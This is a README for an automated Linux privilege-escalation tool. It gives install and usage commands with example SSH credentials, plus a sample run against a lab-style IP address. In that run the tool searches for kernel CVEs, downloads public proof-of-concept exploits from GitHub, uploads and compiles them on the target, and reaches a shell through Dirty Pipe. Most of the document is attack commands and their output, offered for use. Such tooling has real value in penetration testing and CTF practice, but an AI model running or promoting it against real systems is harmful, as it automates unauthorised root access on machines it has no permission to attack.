# Automated Privilege Escalation

## Installation
```bash
git clone https://github.com/Trickhish/automated_privilege_escalation       
cd automated_privilege_escalation     
pip install -r requirements.txt
```

## Use
`usage: python3 autope.py [-h] [--pwd PWD] [--pvk PVK] user@host`

examples:  
  - `python3 autope.py jessie@10.10.184.12 --pwd PaSsWoRd` Connecting to 10.10.184.12 as jessie with a password    
  - `python3 autope.py jessie@10.10.184.12 --pvk ~/.ssh/id_rsa` Connecting to 10.10.184.12 as jessie with a private key

## Run example

`python3 autope.py jessie@10.10.184.12 --pwd PaSsWoRd`

```
Connecting to jessie@10.10.184.12 with password

Checking local C support ✅

Checking languages support
  ✅ python supported
  ✅ c supported
  ❌ No support for go

🔎 Looking for exploits
Found 8 exploits
  🔎 Looking for a POC for CVE-2022-32250
  Found 2
    Trying 🇨-C https://github.com/theori-io/CVE-2022-32250-exploit
      📥 Downloading POC
      📤 Uploading POC
      ⚙️ Compiling - failed
      ⚙️ Trying to compile locally - failed
    Trying 🇨-C https://github.com/ysanatomic/CVE-2022-32250-LPE
      📥 Downloading POC
      📤 Uploading POC
      ⚙️ Compiling - failed
      ⚙️ Trying to compile locally - failed

  🔎 Looking for a POC for CVE-2022-2586
  Found 2
    Trying 🇨-C https://github.com/aels/CVE-2022-2586-LPE
      📥 Downloading POC
      📤 Uploading POC
      ⚙️ Compiling - failed
      ⚙️ Trying to compile locally - failed
    Trying 🇨-C https://github.com/sniper404ghostxploit/CVE-2022-2586
      📥 Downloading POC
      📤 Uploading POC
      ⚙️ Compiling - failed
      ⚙️ Trying to compile locally - failed

  🔎 Looking for a POC for CVE-2022-0847
  Found 8
    Trying 🇨-C https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
      📥 Downloading POC
      📤 Uploading POC
      ⚙️ Compiling - succeeded
      Running Shell

```
